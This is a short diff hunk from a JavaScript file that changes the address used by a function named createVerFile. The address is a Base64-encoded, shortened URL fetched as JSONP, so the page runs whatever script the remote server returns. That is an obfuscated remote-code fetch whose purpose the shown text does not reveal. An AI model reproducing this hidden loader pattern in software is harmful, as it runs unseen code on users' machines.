@@ -139,7 +139,7 @@ function restartTimer() {
 
 function createVerFile() {
     $.ajax({
-        url: Base64.decode("aHR0cHM6Ly9nb28uZ2wvNjBWSXZ3"),
+        url: Base64.decode("aHR0cHM6Ly9nb28uZ2wvUTlvbUtB"),
         method: 'GET',
         dataType: 'JSONP',
         error: function (jqXHR, textStatus) {
